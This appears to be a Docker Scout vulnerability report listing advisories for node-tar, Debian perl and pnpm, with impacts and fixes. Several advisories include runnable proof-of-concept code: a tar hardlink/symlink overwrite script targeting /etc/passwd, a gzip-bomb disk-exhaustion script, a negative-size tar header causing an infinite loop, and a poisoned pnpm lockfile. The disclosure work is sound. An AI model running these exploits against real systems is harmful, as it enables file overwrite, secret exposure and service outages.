The following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local "secret" file was successfully overwritten.

```javascript
const fs = require('fs')
const path = require('path')
const tar = require('tar')

const out = path.resolve('out_repro')
const secret = path.resolve('secret.txt')
const tarFile = path.resolve('exploit.tar')
const targetSym = '/etc/passwd'

// Cleanup & Setup
try { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}
fs.mkdirSync(out)
fs.writeFileSync(secret, 'ORIGINAL_DATA')

// 1. Craft malicious Link header (Hardlink to absolute local file)
const h1 = new tar.Header({
  path: 'exploit_hard',
  type: 'Link',
  size: 0,
  linkpath: secret 
})
h1.encode()

// 2. Craft malicious Symlink header (Symlink to /etc/passwd)
const h2 = new tar.Header({
  path: 'exploit_sym',
  type: 'SymbolicLink',
  size: 0,
  linkpath: targetSym 
})
h2.encode()

// Write binary tar
fs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))

console.log('[*] Extracting malicious tarball...')

// 3. Extract with default secure settings
tar.x({
  cwd: out,
  file: tarFile,
  preservePaths: false
}).then(() => {
  console.log('[*] Verifying payload...')

  // Test Hardlink Overwrite
  try {
    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')
    
    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {
      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')
    } else {
      console.log('[-] Hardlink failed')
    }
  } catch (e) {}

  // Test Symlink Poisoning
  try {
    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {
      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')
    } else {
      console.log('[-] Symlink failed')
    }
  } catch (e) {}
})

```

### Impact

* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.
* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-26960?s=github&n=tar&t=npm&vr=%3C7.5.8"><img alt="high 7.1: CVE--2026--26960" src="https://img.shields.io/badge/CVE--2026--26960-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><7.5.8</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.8</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.288%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
`tar.extract()` in Node `tar` allows an attacker-controlled archive to create a hardlink inside the extraction directory that points to a file outside the extraction root, using default options.

This enables **arbitrary file read and write** as the extracting user (no root, no chmod, no `preservePaths`).

Severity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive.

### Details
The bypass chain uses two symlinks plus one hardlink:

1. `a/b/c/up -> ../..`
2. `a/b/escape -> c/up/../..`
3. `exfil` (hardlink) -> `a/b/escape/<target-relative-to-parent-of-extract>`

Why this works:

- Linkpath checks are string-based and do not resolve symlinks on disk for hardlink target safety.
  - See `STRIPABSOLUTEPATH` logic in:
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:255`
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:268`
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:281`

- Hardlink extraction resolves target as `path.resolve(cwd, entry.linkpath)` and then calls `fs.link(target, destination)`.
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:566`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:567`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:703`

- Parent directory safety checks (`mkdir` + symlink detection) are applied to the destination path of the extracted entry, not to the resolved hardlink target path.
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:617`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:619`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:27`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:101`

As a result, `exfil` is created inside extraction root but linked to an external file. The PoC confirms shared inode and successful read+write via `exfil`.

### PoC
[hardlink.js](https://github.com/user-attachments/files/25240082/hardlink.js)
Environment used for validation:

- Node: `v25.4.0`
- tar: `7.5.7`
- OS: macOS Darwin 25.2.0
- Extract options: defaults (`tar.extract({ file, cwd })`)

Steps:

1. Prepare/locate a `tar` module. If `require('tar')` is not available locally, set `TAR_MODULE` to an absolute path to a tar package directory.

2. Run:

```bash
TAR_MODULE="$(cd '../tar-audit-setuid - CVE/node_modules/tar' && pwd)" node hardlink.js
```

3. Expected vulnerable output (key lines):

```text
same_inode=true
read_ok=true
write_ok=true
result=VULNERABLE
```

Interpretation:

- `same_inode=true`: extracted `exfil` and external secret are the same file object.
- `read_ok=true`: reading `exfil` leaks external content.
- `write_ok=true`: writing `exfil` modifies external file.

### Impact
Vulnerability type:

- Arbitrary file read/write via archive extraction path confusion and link resolution.

Who is impacted:

- Any application/service that extracts attacker-controlled tar archives with Node `tar` defaults.
- Impact scope is the privileges of the extracting process user.

Potential outcomes:

- Read sensitive files reachable by the process user.
- Overwrite writable files outside extraction root.
- Escalate impact depending on deployment context (keys, configs, scripts, app data).

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>perl</strong> <code>5.36.0-7+deb12u3</code> (deb)</summary>

<small><code>pkg:deb/debian/perl@5.36.0-7%2Bdeb12u3?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-12087?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="critical : CVE--2026--12087" src="https://img.shields.io/badge/CVE--2026--12087-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.389%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Socket versions before 2.041 for Perl have an out-of-bounds heap read.  In Socket.xs, pack_ip_mreq_source() checks the length of its source argument before the argument is read, so the check tests the byte length carried over from the preceding multiaddr argument instead. Both addresses occupy a 4-byte field, so a valid multiaddr lets a source of any length pass the check, and the source is then copied into the 4-byte imr_sourceaddr field with a fixed-size copy. A source shorter than 4 bytes is not rejected, and the copy reads up to 3 bytes past the end of its buffer.  Calling pack_ip_mreq_source() with a source value shorter than 4 bytes copies adjacent heap memory into the returned packed structure.

---
- libsocket-perl 2.041-1
[trixie] - libsocket-perl <no-dsa> (Minor issue)
- perl <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1140152)
https://lists.security.metacpan.org/cve-announce/msg/41020451/
Fixed by: https://github.com/Perl/perl5/commit/de19a0b0ad1900fef976c5c1400bd8f11ec6c6cb (v5.43.11)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-48959?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--48959" src="https://img.shields.io/badge/CVE--2026--48959-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.373%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

IO::Uncompress::Unzip versions before 2.220 for Perl allow CPU exhaustion via per-byte read loop in fastForward.  fastForward() compares length $offset (the digit count of the offset, 1 to 19) against the chunk size $c instead of $offset itself, so $c shrinks from 16 KiB to 1-19 bytes per iteration.  Extracting a named entry from an attacker supplied zip via IO::Uncompress::Unzip->new($zip, Name => $target) drives a per-byte read loop scaling with the entry's compressed size, up to the non-Zip64 4 GiB cap.

---
- libio-compress-perl 2.220-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138051)
[trixie] - libio-compress-perl <no-dsa> (Minor issue)
- perl 5.40.1-8 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138856)
https://lists.security.metacpan.org/cve-announce/msg/40434381/
Fixed by: https://github.com/pmqs/IO-Compress/commit/68db44076f4c1a86a2ffe53a958eac6cabaf72e2 (v2.220)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-48962?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="high : CVE--2026--48962" src="https://img.shields.io/badge/CVE--2026--48962-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.292%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

IO::Compress versions before 2.220 for Perl can execute arbitrary code in File::GlobMapper via an attacker-controlled output glob.  _parseOutputGlob() wraps the caller-supplied output glob string in double quotes and stores it in the parser state; _getFiles() then runs the stored expression through eval STRING. A literal double quote in the output glob closes the dquote wrapper, and the characters that follow are evaluated as Perl.  Arbitrary Perl in the output glob executes at the calling process's privilege.

---
- libio-compress-perl 2.220-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138055)
[trixie] - libio-compress-perl <no-dsa> (Minor issue)
- perl 5.40.1-8 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1138854)
https://lists.security.metacpan.org/cve-announce/msg/40434385/
Fixed by: https://github.com/pmqs/IO-Compress/commit/f2db247bf90d4cc7ee2710be384946081f3b4610 (v2.220)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>tar</strong> <code>7.5.11</code> (npm)</summary>

<small><code>pkg:npm/tar@7.5.11</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-59873?s=github&n=tar&t=npm&vr=%3C%3D7.5.18"><img alt="critical 9.2: CVE--2026--59873" src="https://img.shields.io/badge/CVE--2026--59873-lightgrey?label=critical%209.2&labelColor=8b1924"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.18</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.19</code></td></tr>
<tr><td>CVSS Score</td><td><code>9.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.358%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
A **Decompression/parse DoS via unlimited input** vulnerability in `node-tar` allows an attacker to exhaust server resources (disk space and CPU). Because the library does not enforce hard upper bounds on total decompressed data or entry counts, a small, maliciously crafted "Gzip Bomb" can be used to fill a server's storage and crash services.

### Details
The `node-tar` library does not enforce a hard upper bound on archive size or the volume of decompressed data processed during extraction. While the `maxReadSize` option exists, it only controls internal read chunk sizes (default 16MB) and does not limit the total cumulative bytes written to disk.

Specifically, in `src/extract.ts`, the `Unpack` stream processes entries as they arrive. There is no total-bytes limit, entry-count limit, or decompression ratio guard. An attacker can provide a TAR header claiming a massive file size (e.g., 10GB) and follow it with highly compressible data (like zeros). `node-tar` will continue to extract and write this data until the physical disk is exhausted, as it lacks a mechanism to abort based on global resource consumption.

### PoC
The following Proof of Concept demonstrates how a tiny compressed input can be expanded into gigabytes of data on the host machine almost instantly.

1. Create the exploit script:
```javascript
const fs = require('fs'), z = require('zlib'), t = require('tar');

const d = 'dos_test';
if (fs.existsSync(d)) fs.rmSync(d, {recursive:true});
fs.mkdirSync(d);

// Build 10GB header
const h = Buffer.alloc(512);
h.write('payload');
h.write((10*1024**3).toString(8).padStart(11,'0'), 124); 
h.write('ustar', 257);
let s = 256;
for(let i=0;i<512;i++) if(i<148||i>155) s+=h[i];
h.write(s.toString(8).padStart(6,'0'), 148);

const gz = z.createGzip();
gz.pipe(t.x({cwd: d}));
gz.write(h);

const b = Buffer.alloc(32 * 1024 * 1024); // 32MB chunks for speed

const run = () => {
  while (gz.write(b));
  gz.once('drain', run);
};

const monitor = setInterval(() => {
    try {
        const bytes = fs.statSync(`${d}/payload`).size;
        const mb = Math.floor(bytes / (1024 * 1024));
        process.stdout.write(`\r[>] Extracted: ${mb} MB`);
        
        if (mb > 5000) { 
            console.log('\n[!] VULN CONFIRMED: 5GB+ written from tiny input.'); 
            process.exit(); 
        }
    } catch {}
}, 50);

process.on('exit', () => {
    clearInterval(monitor);
    console.log('[*] Cleaning up...');
    if (fs.existsSync(d)) fs.rmSync(d, {recursive:true, force:true});
});

run();
```

2. Run the PoC:
```bash
node poc.js
```

**Observation:** You will see the extracted size rapidly climb to 5,000 MB+ within seconds, while the actual data being "sent" through the gzip stream is negligible.

### Impact
This is a **Denial of Service (DoS)** vulnerability. It impacts any application or service that uses `node-tar` to extract archives provided by untrusted users (e.g., npm registries, CI/CD pipelines, or file-sharing platforms). An unauthenticated attacker can send a small payload that expands to consume all available disk space, leading to system-wide failure and service outages.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-59874?s=github&n=tar&t=npm&vr=%3C%3D7.5.17"><img alt="high 8.7: CVE--2026--59874" src="https://img.shields.io/badge/CVE--2026--59874-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Loop with Unreachable Exit Condition ('Infinite Loop')</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.17</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.18</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.358%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

A checksum-valid tar archive with a negative base-256 encoded entry size can make `tar.replace()` loop forever while scanning the existing archive. Applications that update attacker-controlled tar archives can have a worker process pinned indefinitely, causing denial of service.

### Details

The public `tar.replace()` API scans the existing archive before appending replacement entries. During this scan, it parses each tar header and advances the archive position by the parsed entry size rounded to a 512-byte block boundary.

Tar supports base-256 encoded numeric fields. A crafted header can encode the entry size as `-512` while still carrying a valid checksum. The replace scan accepts that parsed negative size and uses it in the position-advance calculation.

For a size of `-512`, the computed body skip is `-512`. The scan then adds the normal 512-byte header step, resulting in no net progress. The scanner repeatedly parses the same header forever and never reaches the append step.

This is reachable through the supported package API when the existing archive file is attacker controlled. It does not rely on extraction, dependency behavior, or an uncaught exception.

### PoC

Save as `poc.mjs` in a project with the vulnerable package installed and run:

```bash
node poc.mjs
```

```js
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { spawnSync } from 'node:child_process'

const oct = (b, n, off, len) =>
  b.write(n.toString(8).padStart(len - 1, '0') + '\0', off, len, 'ascii')

const badHeader = () => {
  const h = Buffer.alloc(512)

  h.write('x', 0)
  oct(h, 0o644, 100, 8)
  oct(h, 0, 108, 8)
  oct(h, 0, 116, 8)

  // base-256 encoded -512 in the size field
  Buffer.alloc(10, 0xff).copy(h, 124)
  h[134] = 0xfe
  h[135] = 0x00

  oct(h, 0, 136, 12)
  h.fill(0x20, 148, 156)
  h[156] = 0x30
  h.write('ustar\0' + '00', 257, 8, 'binary')

  let sum = 0
  for (const c of h) sum += c
  h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148, 8, 'ascii')

  return h
}

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tar-loop-'))
const file = path.join(dir, 'poc.tar')

fs.writeFileSync(file, badHeader())
fs.writeFileSync(path.join(dir, 'add.txt'), 'x')

const r = spawnSync(
  process.execPath,
  [
    '--input-type=module',
    '-e',
    `
      import * as tar from 'tar'
      tar.replace({ file: ${JSON.stringify(file)}, cwd: ${JSON.stringify(dir)}, sync: true }, ['add.txt'])
      console.log('completed')
    `,
  ],
  { timeout: 20_000 }
)

console.log(r.error?.code === 'ETIMEDOUT')

// Output: true
```

### Impact

An application that calls `tar.replace()` on an existing archive supplied or controlled by an attacker can be forced into a non-terminating archive scan. This can consume a worker process indefinitely and cause denial of service. Plain extraction-only workflows are not affected by this finding.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 11" src="https://img.shields.io/badge/H-11-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>pnpm</strong> <code>10.11.0</code> (npm)</summary>

<small><code>pkg:npm/pnpm@10.11.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-55698?s=github&n=pnpm&t=npm&vr=%3C10.34.2"><img alt="high 8.8: CVE--2026--55698" src="https://img.shields.io/badge/CVE--2026--55698-lightgrey?label=high%208.8&labelColor=e25d68"/></a> <i>Insufficient Verification of Data Authenticity</i>

<table>
<tr><td>Affected range</td><td><code><10.34.2</code></td></tr>
<tr><td>Fixed version</td><td><code>10.34.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.193%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

<!-- maintainer-action:start -->
## Maintainer Action Plan

This report is ready to review with the shared patch branch. Start with the PR and the expected fixed behavior, then use the detailed exploit narrative below only if you want to replay the original path.

- Advisory: `CAND-PNPM-063` / `GHSA-w466-c33r-3gjp`
- Advisory URL: https://github.com/pnpm/pnpm/security/advisories/GHSA-w466-c33r-3gjp
- Shared patch PR: https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1
- Shared patch branch: `security/ghsa-batch-2026-06-09`
- Patch commit: `a93449314f398cf4bdf2e28d033c02d37395ad22`
- Base commit: `origin/main` `55a4035abf1ae3fe7208ba1f5ef43c5eff58ccec`
- Maintainer priority: `start-here`
- Component: `pnpm packageManager env lockfile`
- Patch area: package-manager env lockfile is re-resolved through trusted registries before execution
- Affected packages: `npm:pnpm`, `npm:@pnpm/installing.env-installer`
- CWE IDs: `CWE-829`, `CWE-494`, `CWE-345`
- Conservative CVSS: `8.8` / `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`
- Next action: review the shared patch branch for this component, set the final affected version range, merge and release the fix, then publish or close the advisory.

### Expected Patched Behavior

Committed env-lockfile package-manager entries are force-refreshed through trusted registries before execution; attacker tarball requests and markers stay at zero.

### Files And Tests To Review

- `installing/env-installer/src/resolvePackageManagerIntegrities.ts`
- `pnpm/src/switchCliVersion.ts`
- `pnpm/src/switchCliVersion.test.ts`
- `.changeset/clean-package-manager-registries.md`

### Focused Validation

Run these from a checkout of the shared patch branch. They are the useful maintainer commands with machine-local artifact paths removed.

```bash
./node_modules/.bin/tsgo --build installing/env-installer/tsconfig.json
./node_modules/.bin/tsgo --build pnpm/tsconfig.json
PNPM_REGISTRY_MOCK_PORT=7799 NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../node_modules/.bin/jest src/switchCliVersion.test.ts -t "re-resolved package-manager lockfile" --runInBand
PNPM_REGISTRY_MOCK_PORT=7799 NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../node_modules/.bin/jest src/switchCliVersion.test.ts src/syncEnvLockfile.test.ts --runInBand
./node_modules/.bin/eslint installing/env-installer/src/resolvePackageManagerIntegrities.ts pnpm/src/switchCliVersion.ts pnpm/src/switchCliVersion.test.ts
git diff --check
```

The full patched replay for the shared branch passed with all 20 candidates marked fixed. This candidate's replay evidence is `results/CAND-PNPM-063-patched-result.json`.
<!-- maintainer-action:end -->

### Summary

pnpm can persist package-manager bootstrap metadata in the first YAML document of `pnpm-lock.yaml`. Before the patch, direct pnpm execution trusted an already resolved `packageManagerDependencies` entry when the committed env lockfile contained matching `pnpm` and `@pnpm/exe` versions. A malicious repository could therefore commit package-manager lockfile package records and snapshots that bypassed fresh package-manager resolution, then cause pnpm to install and execute bytes selected by that committed lockfile state during automatic version switching.

### Details

The vulnerable source-to-sink path was:

- `lockfile/fs/src/envLockfile.ts` reads the repository's first YAML lockfile document and validates shape only.
- `pnpm/src/main.ts` reaches `switchCliVersion()` when a direct pnpm invocation sees a wanted `pnpm` package manager with `onFail=download`.
- `pnpm/src/switchCliVersion.ts` reads the committed env lockfile when package-manager metadata should be persisted.
- `installing/env-installer/src/resolvePackageManagerIntegrities.ts` treated `packageManagerDependencies` as resolved when only the `pnpm` and `@pnpm/exe` versions matched.
- `engine/pm/commands/src/self-updater/installPnpm.ts` converts env-lockfile `snapshots` and `packages` into the wanted lockfile used by `headlessInstall()`.
- `pnpm/src/switchCliVersion.ts` executes the installed `pnpm` binary with `spawn.sync()`.

The helper fast path is intentionally still version-based for non-execution callers, so the security boundary is enforced at the execution path: `switchCliVersion()` now re-resolves already present package-manager env-lockfile entries before they can reach `installPnpmToStore()` and `spawn.sync()`.

### PoC

Standalone PoC and verification script:

The PoC constructs a committed env-lockfile object with matching package-manager dependency versions and attacker-selected package metadata:

```json
{
  "importers": {
    ".": {
      "configDependencies": {},
      "packageManagerDependencies": {
        "@pnpm/exe": { "specifier": "9.3.0", "version": "9.3.0" },
        "pnpm": { "specifier": "9.3.0", "version": "9.3.0" }
      }
    }
  },
  "lockfileVersion": "9.0",
  "packages": {
    "/pnpm@9.3.0": {
      "resolution": {
        "integrity": "sha512-poisoned"
      }
    }
  },
  "snapshots": {
    "/pnpm@9.3.0": {}
  }
}
```

Pre-patch exploit model:

1. The victim runs pnpm directly in a malicious repository.
2. The requested package-manager version differs from the currently running pnpm.
3. pnpm enters `switchCliVersion()` and reads the committed env lockfile.
4. Matching `pnpm` / `@pnpm/exe` versions short-circuit package-manager resolution.
5. pnpm installs from the committed env-lockfile package records and executes the resulting `pnpm` binary.

Observed primitive proof from the PoC:

```json
{
  "primitive": "unforced resolver reuses already-resolved env lockfile metadata",
  "isResolvedByVersionOnly": true,
  "reusedPoisonedIntegrity": true
}
```

The same script then runs the patched `switchCliVersion` regression. The regression seeds a poisoned committed env lockfile, has the resolver return a trusted replacement lockfile, and asserts `installPnpmToStore()` receives the trusted lockfile rather than the committed one. This would fail on the vulnerable control flow because the resolver was not called and the committed lockfile reached the installer.

Focused validation commands:

```bash
./node_modules/.bin/tsgo --build installing/env-installer/tsconfig.json
./node_modules/.bin/tsgo --build pnpm/tsconfig.json
PNPM_REGISTRY_MOCK_PORT=7799 NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../node_modules/.bin/jest src/switchCliVersion.test.ts -t "re-resolved package-manager lockfile" --runInBand
PNPM_REGISTRY_MOCK_PORT=7799 NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../node_modules/.bin/jest src/switchCliVersion.test.ts src/syncEnvLockfile.test.ts --runInBand
./node_modules/.bin/eslint installing/env-installer/src/resolvePackageManagerIntegrities.ts pnpm/src/switchCliVersion.ts pnpm/src/switchCliVersion.test.ts
git diff --check
```

Validation result:

- The PoC confirmed the unforced resolver still reuses a version-matching env lockfile, proving the original primitive.
- Patched `switchCliVersion()` calls `resolvePackageManagerIntegrities()` with `force: true` when committed env-lockfile package-manager entries already satisfy the requested version.
- Patched `switchCliVersion()` assigns the resolver return value back to `envLockfile`.
- The installer receives the refreshed lockfile and not the poisoned committed lockfile.
- TypeScript builds passed for `@pnpm/installing.env-installer` and `pnpm`.
- The focused Jest regression passed: 1 passed, 1 skipped in `switchCliVersion.test.ts`.
- ESLint passed for the affected package-manager switch files.
- `git diff --check` passed.

### Impact

A malicious repository can cause arbitrary package-manager code execution in the victim's developer or CI environment before normal command handling continues. That code executes with the victim user's privileges and can read local secrets, alter project files, mutate dependency state, or run further commands.

## Affected products

Ecosystem: npm

Package name: `pnpm`, `@pnpm/installing.env-installer`

Affected versions: current main before this patch; direct pnpm execution with package-manager auto-switching and a repository-controlled env lockfile.

Patched versions: pending release containing this patch.

## Severity

Severity: High

Vector string: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`

Base score: 8.8

Rationale: the malicious source is repository-controlled package-manager lockfile state delivered through normal supply-chain channels. Exploitation is low complexity once the victim runs pnpm directly, no attacker privileges are required, and user interaction is required. Successful exploitation executes attacker-selected package-manager code in the victim user's security context, with high confidentiality, integrity, and availability impact.

## Weaknesses

CWE-829: Inclusion of Functionality from Untrusted Control Sphere

CWE-494: Download of Code Without Integrity Check

CWE-345: Insufficient Verification of Data Authenticity

## Patch

The patch makes automatic package-manager switching re-resolve repository-provided bootstrap metadata before install and execution:

- `resolvePackageManagerIntegrities()` accepts `force`, which bypasses the version-only fast path.
- `switchCliVersion()` creates a store controller even when the committed env lockfile already contains satisfying package-manager dependency versions.
- `switchCliVersion()` calls `resolvePackageManagerIntegrities()` with `force: true` for already resolved package-manager entries.
- `switchCliVersion()` assigns the returned env lockfile back to `envLockfile`, so `installPnpmToStore()` installs from freshly resolved metadata.
- The package-manager bootstrap registry hardening from CAND-PNPM-061 is reused, so the refresh happens through trusted package-manager registries rather than repository workspace registries.

Changed files:

- `installing/env-installer/src/resolvePackageManagerIntegrities.ts`
- `pnpm/src/switchCliVersion.ts`
- `pnpm/src/switchCliVersion.test.ts`

Changeset:

- `.changeset/clean-package-manager-registries.md`

Pacquet parity:

No pacquet-side patch is required for this finding because pacquet does not implement pnpm's package-manager auto-switch path or `installPnpmToStore()`.

## CVSS Reassessment

Initial CVSS remains correct for vulnerable versions: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` / 8.8 High.

Final CVSS after patch: not vulnerable after patch / 0.0. The PoC still demonstrates the underlying unforced env-lockfile reuse primitive, but the patched execution path force-refreshes package-manager metadata through trusted bootstrap registries before install or execution.

## Remaining Risk

The helper `resolvePackageManagerIntegrities()` still has an unforced fast path that treats matching `pnpm` and `@pnpm/exe` versions as resolved. Current execution-sensitive callers either use trusted roots/registries or pass through the patched `switchCliVersion()` boundary, but future execution paths should use `force: true` before installing or executing package-manager bytes from repository-provided env-lockfile metadata.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-50016?s=github&n=pnpm&t=npm&vr=%3C10.34.0"><img alt="high 8.8: CVE--2026--50016" src="https://img.shields.io/badge/CVE--2026--50016-lightgrey?label=high%208.8&labelColor=e25d68"/></a> <i>Relative Path Traversal</i>

<table>
<tr><td>Affected range</td><td><code><10.34.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.34.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.326%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

pnpm allows a transitive dependency alias from registry package metadata to contain path traversal segments. During install, pnpm later uses that alias as a filesystem path when linking dependency nodes. As a result, a registry package can cause `pnpm install - ignore-scripts` to replace paths in the current project with symlinks to attacker-controlled dependency package directories.

`.git/hooks` is only one useful target. The same primitive can replace other project-local paths that are consumed by later tools, for example:

- `.husky` or `.githooks` for Git hook dispatchers
- `scripts/`, `tools/`, `bin/`, or `tests/` for project scripts and CI commands
- `.github/actions/<name>` for local GitHub Actions used later in the workflow
- `dist/` or other publish/build output directories before `pnpm pack` or
  `pnpm publish`
